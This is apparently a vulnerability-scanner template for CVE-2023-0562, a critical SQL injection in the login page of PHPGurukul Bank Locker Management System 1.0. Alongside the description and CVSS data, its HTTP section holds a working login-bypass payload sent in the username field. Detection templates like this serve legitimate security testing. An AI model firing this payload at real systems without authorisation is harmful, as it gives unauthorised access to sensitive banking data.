id: CVE-2023-0562

info:
  name: Bank Locker Management System v1.0 - SQL Injection
  author: Harsh
  severity: critical
  description: |
    A vulnerability was found in PHPGurukul Bank Locker Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file index.php of the component Login. The manipulation of the argument username leads to sql injection.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to extract sensitive information from the database.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://vuldb.com/?ctiid.219716
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0562
    - https://vuldb.com/?id.219716
    - https://github.com/ctflearner/ctflearner
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-0562
    cwe-id: CWE-89
    epss-score: 0.81836
    epss-percentile: 0.99147
    cpe: cpe:2.3:a:phpgurukul:bank_locker_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: phpgurukul
    product: bank_locker_management_system
  tags: cve,cve2023,blms,sqli,bypass,phpgurukul,vuln

http:
  - raw:
      - |
        POST /banker/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin%27+AND+4719%3D4719--+GZHh&inputpwd=ABC&login=

    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "admin")'
          - 'contains(body, "BLMS | Dashboard")'
        condition: and
# digest: 4a0a0047304502210089fbb08fe863dd1303eb7c8aaacfea1e2146e07bc330d23d118bd740418ae96d02205f2a7fdccdf47e47cf5a20520d2cb7d113c3cf4cedbffc3370a8d8fc3e8be21e:922c64590222798bb761d5b6d8e72950